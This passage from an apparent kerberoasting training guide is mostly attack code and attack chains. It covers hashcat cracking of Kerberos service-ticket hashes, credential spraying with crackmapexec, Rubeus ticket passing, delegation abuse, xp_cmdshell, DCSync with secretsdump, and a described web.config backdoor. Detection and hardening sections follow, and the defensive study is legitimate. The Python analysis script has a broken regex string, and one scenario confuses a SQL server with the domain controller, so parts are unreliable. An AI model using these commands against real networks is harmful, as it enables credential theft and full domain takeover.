hashcat -m 13100 hashes.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule
```

**Optimized Corporate Wordlists**:

```bash
# Create corporate-specific wordlist
cat > corporate_wordlist.txt << 'EOF'
CompanyName2024
CompanyName2023
Welcome2024
Password2024
Spring2024
Summer2024
Fall2024
Winter2024
Service123
SQLServer2024
Database!
Admin123
EOF

hashcat -m 13100 hashes.txt corporate_wordlist.txt -O
```

#### Rule-Based Attacks

**Custom Service Account Rules**:

```bash
# Create service_account.rule
cat > service_account.rule << 'EOF'
# Add years
$2$0$2$4
$2$0$2$3
$2$0$2$2

# Add exclamation
$!

# Capitalize first letter + year
c$2$0$2$4

# Append common suffixes
$S$Q$L
$D$B
EOF

hashcat -m 13100 hashes.txt base_words.txt -r service_account.rule
```

#### Mask Attacks

**Common Service Account Password Patterns**:

```bash
# Pattern: CompanyName + 4 digits
hashcat -m 13100 hashes.txt -a 3 CompanyName?d?d?d?d

# Pattern: Service + Special + Numbers
hashcat -m 13100 hashes.txt -a 3 Service?s?d?d?d

# Pattern: 8-12 character complexity
hashcat -m 13100 hashes.txt -a 3 -i --increment-min=8 --increment-max=12 ?a?a?a?a?a?a?a?a
```

#### Hybrid Attacks

```bash
# Wordlist + digits
hashcat -m 13100 hashes.txt -a 6 wordlist.txt ?d?d?d?d

# Company names + years
hashcat -m 13100 hashes.txt -a 6 company_names.txt ?d?d?d?d
```

### Advanced Techniques

#### Performance Optimization

```bash
# Optimized kernel with maximum workload
hashcat -m 13100 hashes.txt wordlist.txt -O -w 4

# Multi-GPU
hashcat -m 13100 hashes.txt wordlist.txt -O -w 4 -d 1,2,3,4
```

#### Cloud-Based Cracking

**AWS GPU Instance Setup**:

```bash
# Launch p3.2xlarge instance (Tesla V100 GPU)
# Install hashcat
sudo apt update
sudo apt install -y hashcat nvidia-utils-470

# Verify GPU
nvidia-smi

# Start cracking
hashcat -m 13100 kerberoast_hashes.txt rockyou.txt -O -w 4 \
    --status --status-timer=30 -o cracked.txt
```

### Password Analysis

**Analyzing Cracked Passwords**:

```python
#!/usr/bin/env python3
import re
from collections import Counter

def analyze_passwords(password_file):
    with open(password_file, 'r') as f:
        passwords = [line.strip() for line in f if line.strip()]
    
    analysis = {
        'total': len(passwords),
        'lengths': Counter(),
        'patterns': {
            'contains_year': 0,
            'ends_with_special': 0,
            'contains_company': 0,
        }
    }
    
    for password in passwords:
        analysis['lengths'][len(password)] += 1
        
        if re.search(r'20\d{2}', password):
            analysis['patterns']['contains_year'] += 1
        if re.match(r'.*[!@#$%], password):
            analysis['patterns']['ends_with_special'] += 1
        if re.search(r'company|corp', password.lower()):
            analysis['patterns']['contains_company'] += 1
    
    print(f"Total Passwords: {analysis['total']}")
    print(f"Year-based: {analysis['patterns']['contains_year']}")
    print(f"Special suffix: {analysis['patterns']['ends_with_special']}")
    
    return analysis

analyze_passwords('cracked.txt')
```

---

## 8. Post-Exploitation Considerations

### Credential Validation

#### Verifying Cracked Credentials

**CrackMapExec Validation**:

```bash
# Test SMB authentication
crackmapexec smb dc.company.com -u svc_sql -p 'CrackedPassword!'

# Test across subnet
crackmapexec smb 192.168.1.0/24 -u svc_sql -p 'Password!' --continue-on-success

# Check local admin rights
crackmapexec smb 192.168.1.0/24 -u svc_sql -p 'Password!' --local-auth --sam
```

**PowerShell Validation**:

```powershell
function Test-ADCredential {
    param([string]$Username, [string]$Password, [string]$Domain = $env:USERDNSDOMAIN)
    
    Add-Type -AssemblyName System.DirectoryServices.AccountManagement
    $Context = New-Object System.DirectoryServices.AccountManagement.PrincipalContext(
        [System.DirectoryServices.AccountManagement.ContextType]::Domain, $Domain
    )
    
    $IsValid = $Context.ValidateCredentials($Username, $Password)
    if ($IsValid) {
        Write-Host "[+] Valid: $Username" -ForegroundColor Green
    }
    return $IsValid
}
```

### Privilege Assessment

**PowerView Privilege Enumeration**:

```powershell
# Check group memberships
Get-DomainGroup -UserName svc_sql | Select-Object name

# Find computers with local admin
Find-LocalAdminAccess -UserName svc_sql

# Check delegation rights
Get-DomainUser svc_sql | Select-Object samaccountname, msds-allowedtodelegateto
```

**BloodHound Analysis**:

```cypher
// Find paths to Domain Admins
MATCH p=shortestPath((u:User {name:"SVC_SQL@COMPANY.COM"})-[*1..]->(g:Group {name:"DOMAIN ADMINS@COMPANY.COM"}))
RETURN p

// Find admin rights on computers
MATCH p=(u:User {name:"SVC_SQL@COMPANY.COM"})-[r:AdminTo]->(c:Computer)
RETURN p
```

### Lateral Movement

**Kerberos Ticket Manipulation**:

```cmd
# Request TGT as compromised account
Rubeus.exe asktgt /user:svc_sql /password:Password123! /domain:company.com

# Pass the ticket
Rubeus.exe ptt /ticket:base64_ticket

# Access resources
dir \\sql-server\c$
```

**Constrained Delegation Exploitation**:

```bash
# Request ticket with impersonation
getST.py company.com/svc_sql:'Password!' -spn MSSQLSvc/sql.company.com -impersonate Administrator

# Use ticket
export KRB5CCNAME=Administrator.ccache
impacket-mssqlclient -k -no-pass sql.company.com
```

---

## 9. Detection and Defensive Measures

### Detection Strategies

#### Event Log Monitoring

**Key Event IDs**:
- **4769**: Kerberos service ticket (TGS) was requested
- **4770**: Kerberos service ticket was renewed
- **4768**: Kerberos TGT was requested

**Detection Queries**:

```xml
<!-- Unusual TGS requests -->
<QueryList>
  <Query Id="0">
    <Select Path="Security">
      *[System[EventID=4769]] and
      *[EventData[Data[@Name='TicketEncryptionType'] = '0x17']]
    </Select>
  </Query>
</QueryList>
```

#### PowerShell Detection

```powershell
# Monitor for kerberoasting attempts
$Events = Get-WinEvent -FilterHashtable @{
    LogName='Security'
    ID=4769
    StartTime=(Get-Date).AddHours(-24)
}

$Suspicious = $Events | Where-Object {
    $_.Properties[8].Value -eq '0x17'  # RC4 encryption
} | Group-Object {$_.Properties[0].Value} | Where-Object {$_.Count -gt 5}

if ($Suspicious) {
    Write-Warning "Potential kerberoasting: $($Suspicious.Name -join ', ')"
}
```

#### Network Detection

```bash
# Monitor Kerberos traffic
tshark -f "port 88" -Y "kerberos.msg_type == 12" -T fields -e ip.src -e kerberos.cipher

# Alert on high-volume TGS requests
tshark -f "port 88" -Y "kerberos.msg_type == 12" | awk '{print $1}' | sort | uniq -c | sort -rn
```

### Preventive Measures

#### Account Hardening

```powershell
# Enforce strong passwords for service accounts
$ServiceAccounts = Get-ADUser -Filter {ServicePrincipalName -ne "$null"}

foreach ($Account in $ServiceAccounts) {
    # Set minimum password length
    Set-ADUser $Account -PasswordNeverExpires $false
    
    # Require password change
    Set-ADAccountPassword $Account -Reset -NewPassword (Read-Host -AsSecureString)
}
```

#### Migrate to Managed Service Accounts

```powershell
# Create Group Managed Service Account
New-ADServiceAccount -Name gMSA_SQL -DNSHostName gmsa_sql.company.com `
    -PrincipalsAllowedToRetrieveManagedPassword "SQL_Servers" `
    -ServicePrincipalNames "MSSQLSvc/sql.company.com:1433"

# Install on target server
Install-ADServiceAccount -Identity gMSA_SQL

# Configure SQL Server to use gMSA
# Service account: DOMAIN\gMSA_SQL$
```

#### Disable RC4 Encryption

**Group Policy Configuration**:

```
Computer Configuration → Policies → Windows Settings → Security Settings → Local Policies → Security Options

"Network security: Configure encryption types allowed for Kerberos"
- ☐ DES_CBC_CRC
- ☐ DES_CBC_MD5
- ☐ RC4_HMAC_MD5
- ☑ AES128_HMAC_SHA1
- ☑ AES256_HMAC_SHA1
- ☑ Future encryption types
```

#### Implement Monitoring

```powershell
# Scheduled task for continuous monitoring
$Action = New-ScheduledTaskAction -Execute "PowerShell.exe" `
    -Argument "-File C:\Scripts\Monitor-Kerberoasting.ps1"
$Trigger = New-ScheduledTaskTrigger -Daily -At "09:00AM"

Register-ScheduledTask -TaskName "Monitor Kerberoasting" `
    -Action $Action -Trigger $Trigger
```

### Response Procedures

#### Incident Response

1. **Immediate Actions**:
   - Reset compromised passwords
   - Revoke active sessions
   - Enable pre-authentication if disabled
   - Review recent access logs

2. **Investigation**:
   - Analyze security logs
   - Check for lateral movement
   - Review privileged access
   - Examine persistence mechanisms

3. **Remediation**:
   - Implement stronger password policies
   - Migrate to managed service accounts
   - Disable weak encryption
   - Enhance monitoring

---

## 10. Real-World Scenarios and Case Studies

### Scenario 1: SQL Server Service Account Compromise

**Background**:
Enterprise with multiple SQL servers using domain service accounts with SPNs.

**Attack Chain**:

```bash
# 1. Enumerate SPNs
GetUserSPNs.py company.com/intern:Welcome123 -dc-ip 10.0.0.10

# Output shows svc_sqladmin with old password
# 2. Request ticket
GetUserSPNs.py company.com/intern:Welcome123 -request-user svc_sqladmin

# 3. Crack weak password
hashcat -m 13100 svc_sqladmin.hash rockyou.txt
# Cracked: SQLAdmin2019!

# 4. Validate and assess privileges
crackmapexec mssql 10.0.0.0/24 -u svc_sqladmin -p 'SQLAdmin2019!'
# Result: sysadmin on 12 SQL servers

# 5. Pivot to domain admin via xp_cmdshell
impacket-mssqlclient company.com/svc_sqladmin:'SQLAdmin2019!'@sql.company.com
SQL> EXEC xp_cmdshell 'whoami';
# Running as SYSTEM on DC
```

**Impact**:
- 12 SQL servers compromised
- Access to sensitive databases
- Domain Admin via SYSTEM on DC

**Lessons Learned**:
- Service accounts need 25+ character passwords
- Implement gMSA for SQL Server
- Disable xp_cmdshell unless required
- Monitor service account usage

### Scenario 2: Web Application Service Account

**Background**:
IIS web applications using service accounts with HTTP SPNs.

**Discovery**:

```powershell
# PowerView enumeration
Get-DomainUser -SPN | Where-Object {$_.serviceprincipalname -like "HTTP/*"}

# Found: svc_webapp with password set 5 years ago
```

**Exploitation**:

```bash
# Kerberoast the account
Rubeus.exe kerberoast /user:svc_webapp /format:hashcat

# Crack password (took 2 hours)
# Password: Company2019!

# Validate access
crackmapexec smb 10.0.0.50 -u svc_webapp -p 'Company2019!'
# Has write access to web server directories
```

**Post-Exploitation**:

- Modified web.config to add backdoor admin account
- Extracted database connection strings
- Accessed application database with sensitive customer data

**Remediation**:
- Migrated to Group Managed Service Accounts
- Implemented application-level encryption for configs
- Enhanced file system auditing

### Scenario 3: Legacy Exchange Server

**Background**:
Old Exchange 2013 server with service account having delegation rights.

**Attack Path**:

```bash
# 1. Identify Exchange service account
GetUserSPNs.py company.com/user:pass | grep -i exchange

# 2. Kerberoast
GetUserSPNs.py company.com/user:pass -request-user svc_exchange

# 3. Crack password
hashcat -m 13100 hash.txt corporate_wordlist.txt
# Cracked: ExchangeService123!

# 4. Check delegation
Get-DomainUser svc_exchange | Select msds-allowedtodelegateto
# Can delegate to any service

# 5. Escalate to Domain Admin
getST.py company.com/svc_exchange:'ExchangeService123!' \
    -spn ldap/dc.company.com -impersonate Administrator

# 6. DCSync attack
secretsdump.py -k -no-pass company.com/Administrator@dc.company.com
```

**Impact**: Complete domain compromise via delegation abuse

---

## Conclusion

### Key Takeaways

1. **Attack Surface**: Any domain user can kerberoast service accounts
2. **Common Weakness**: Service accounts often have weak, old passwords
3. **Detection Challenges**: Legitimate Kerberos traffic masks attacks
4. **Critical Defense**: Migrate to managed service accounts (gMSA)
5. **Encryption Matters**: Disable RC4, enforce AES-only

### Defense Priorities

1. **Immediate**:
   - Audit all service accounts with SPNs
   - Reset passwords to 25+ characters
   - Disable RC4 encryption

2. **Short-term**:
   - Implement gMSA where possible
   - Deploy monitoring for Event ID 4769
   - Restrict service account privileges

3. **Long-term**:
   - Comprehensive service account lifecycle management
   - Automated password rotation
   - Zero-trust architecture

### Additional Resources

- **MITRE ATT&CK**: T1558.003 - Steal or Forge Kerberos Tickets: Kerberoasting
- **Microsoft Documentation**: Group Managed Service Accounts
- **Detection**: Sigma rules for kerberoasting
- **Tools**: Rubeus, Impacket, PowerView, BloodHound

---

## Appendix: Command Reference

### Quick Reference Commands

**Enumeration**:
```bash
# PowerShell
Get-ADUser -Filter {ServicePrincipalName -ne "$null"}

# Impacket
GetUserSPNs.py domain.com/user:pass

# Rubeus
Rubeus.exe kerberoast
```

**Exploitation**:
```bash
# Request tickets
Rubeus.exe kerberoast /outfile:hashes.txt
GetUserSPNs.py domain.com/user:pass -request

# Crack hashes
hashcat -m 13100 hashes.txt rockyou.txt -O -w 4
john --format=krb5tgs hashes.txt --wordlist=rockyou.txt
```

**Detection**:
```powershell
# Monitor Event ID 4769
Get-WinEvent -FilterHashtable @{LogName='Security';ID=4769}

# Check for suspicious patterns
Get-WinEvent -FilterHashtable @{LogName='Security';ID=4769} | 
    Where-Object {$_.Properties[8].Value -eq '0x17'}
```

**Remediation**:
```powershell
# Create gMSA
New-ADServiceAccount -Name gMSA_Service

# Disable RC4
# Via Group Policy: Network security > Configure encryption types

# Reset service account passwords
Set-ADAccountPassword svc_account -Reset
```

---

**Document Version**: 1.0  
**Last Updated**: 2025  
**Author**: Security Training Materials  
**Classification**: Educational Use Only
